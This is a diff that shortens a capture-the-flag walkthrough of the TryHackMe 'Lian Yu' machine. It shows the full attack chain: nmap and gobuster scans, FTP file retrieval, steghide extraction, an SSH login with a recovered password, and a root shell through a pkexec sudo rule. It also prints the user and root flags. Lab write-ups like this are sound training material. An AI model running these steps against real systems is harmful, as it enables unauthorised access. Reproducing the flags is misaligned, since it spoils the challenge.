@@ -1,186 +1,117 @@
-# 🏝️ Lian Yu – TryHackMe Walkthrough (FULL DETAILED REPORT)
+# 🏝️ Lian Yu – TryHackMe Walkthrough
 
 ![Banner](https://i.imgur.com/your-banner-image.png)
 
 ![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
 ![Type](https://img.shields.io/badge/Type-CTF-blue)
-![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20FTP%20%7C%20Stego%20%7C%20PrivEsc-purple)
+![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20Steganography%20%7C%20PrivEsc-purple)
 
 ---
 
-# 🧠 1. Reconnaissance Phase
+# 🧠 1. Reconnaissance
 
-## 🔍 Step 1: Nmap Scan
-
-Aku mula dengan scanning target untuk detect service yang running.
+## 🔍 Nmap Scan
 
 ```bash
 nmap -sC -sV -A 10.48.137.137
-📌 Purpose:
--sC → run default scripts
--sV → detect service version
--A → aggressive scan (OS + traceroute + scripts)
-📊 Results
-Open Ports:
-Port	Service	Version
-21	FTP	vsftpd 3.0.2
-22	SSH	OpenSSH 6.7p1
-80	HTTP	Apache (Purgatory page)
-111	rpcbind	Linux RPC
-🧠 Analysis:
-FTP available → possible file leakage
-Web server → directory enumeration needed
-SSH → potential final access
-rpcbind → usually noise but sometimes attack surface
-🌐 2. Web Enumeration Phase
-🔍 Step 2: Gobuster Directory Scan
-
-Aku scan hidden directories pada web server.
-
+Result:
+21/tcp → FTP (vsftpd 3.0.2)
+22/tcp → SSH (OpenSSH 6.7p1)
+80/tcp → HTTP (Apache - "Purgatory")
+111/tcp → rpcbind
+Analysis:
+FTP likely entry point
+Web server contains hidden directories
+SSH is final access target
+🌐 2. Web Enumeration
+Gobuster Scan
 gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-📌 Result Found:
+Found:
 /island
 /server-status (403 Forbidden)
-🧠 Analysis:
-/island looks like main attack surface
-/server-status blocked → Apache config protected
 🌐 3. Deep Web Enumeration
-🔍 Step 3: Explore /island
+Explore /island
 
-Aku browse manually dan jumpa struktur lain.
-
-Then aku fuzz deeper:
+Found hidden structure:
 
 /island/2100
-📌 Hidden File Found:
+Hidden file discovered:
 /green_arrow.ticket
-🧠 Analysis:
-“2100” looks like key parameter / directory
-“ticket” suggests credential or access token file
-📂 4. FTP Enumeration Phase
-🔐 Step 4: Connect FTP
+📂 4. FTP Enumeration
+Login
 ftp 10.48.165.72
 
-Login:
+Username:
 
-Username: vigilante
-Password: (provided/guessed from challenge context)
-📁 Step 5: Directory Listing
-ls -la
-Files discovered:
+vigilante
+Files found:
 Leave_me_alone.png
 Queen's_Gambit.png
 aa.jpg
-.other_user (hidden file)
-.bash_history (restricted)
-🧠 Analysis:
-Images → likely steganography
-.other_user → very important hidden credential file
-.bash_history → possible command leakage (but restricted)
-📥 Step 6: Download All Files
+.other_user
+Download files
 mget *
-Purpose:
-
-Pull all files locally for offline analysis.
-
-🕵️ 5. Hidden Data Analysis
-📄 Step 7: Read hidden file
+🕵️ 5. Hidden File Analysis
+Read hidden file
 cat .other_user
-📌 Output Insight:
+Insight:
 
-We get a full Deathstroke lore story:
+Story of Slade Wilson (Deathstroke) → hints username for SSH.
 
-Slade Wilson background
-Military history
-Family conflict
-🧠 Important Finding:
-“Slade” = SSH username hint
-“military + experiment” = password clue direction
-🧩 6. Steganography Phase
-🖼️ Step 8: Extract hidden file from image
-
-I tested images using steghide.
-
+🧩 6. Steganography
+Extract hidden file
 steghide --extract -sf aa.jpg
-🔐 Passphrase:
 
-(Not directly given — derived from hints)
+Output:
 
-📦 Output:
 ss.zip
-📂 Step 9: Extract ZIP file
+Unzip file
 unzip ss.zip
 Files extracted:
 passwd.txt
 shado
-📄 Step 10: Analyze extracted files
-passwd.txt
-
-Just lore + hint text (no direct password)
-
-shado file:
+Check password file
 cat shado
-📌 Result:
+Result:
 M3tahuman
-🧠 Analysis:
-This is likely SSH password
-Looks like modified spelling → intentional CTF password
-🔑 7. SSH Access Phase
-🔐 Step 11: Login via SSH
+🔑 7. SSH Access
 ssh slade@10.48.137.137
-Password used:
+
+Password:
+
 M3tahuman
-🎯 Result:
-
-✔ Successful login as slade
-
 👤 8. User Flag
-📄 Step 12: Retrieve user flag
 cat user.txt
-🏁 Output:
+Flag:
 THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
-🧠 Meaning:
-Confirms foothold
-User-level compromise achieved
-⚙️ 9. Privilege Escalation Phase
-🔍 Step 13: Check sudo privileges
+⚙️ 9. Privilege Escalation
+Check sudo rights
 sudo -l
-📌 Output:
+Output:
 (root) PASSWD: /usr/bin/pkexec
-🧠 Analysis:
-pkexec allowed as root
-misconfigured privilege escalation vector
-💥 Step 14: Exploit pkexec
+Exploit
 sudo -u root /usr/bin/pkexec /bin/bash
-🎯 Result:
-
-✔ Root shell obtained
-
 👑 10. Root Flag
-📄 Step 15: Capture root flag
 cat root.txt
-🏁 Output:
+Flag:
 THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
-🧾 FINAL SUMMARY
-🛠️ Full Attack Chain
-Nmap → discover services
-Gobuster → find /island
-Web fuzzing → find /2100 + ticket
-FTP login → retrieve files
-Steganography → extract ZIP
-Credential discovery → M3tahuman
-SSH login → user access
-Sudo misconfig → pkexec abuse
-Root access → full compromise
-💬 CONCLUSION
+🧾 Summary
+Techniques Used:
+Nmap scanning
+Gobuster enumeration
+FTP exploitation
+Steganography extraction
+Hidden file analysis
+SSH login
+Privilege escalation (pkexec abuse)
+💬 Conclusion
 
-This machine heavily relies on:
+This machine demonstrates the importance of:
 
 Deep enumeration
-Hidden files in FTP
-Steganography extraction
-Misconfigured sudo privileges
+Hidden file inspection
+Steganography analysis
+Privilege escalation misconfiguration
 
-👉 Key lesson:
-Even “useless files” often contain the next step in the chain.
+Every small clue leads to full system compromise.
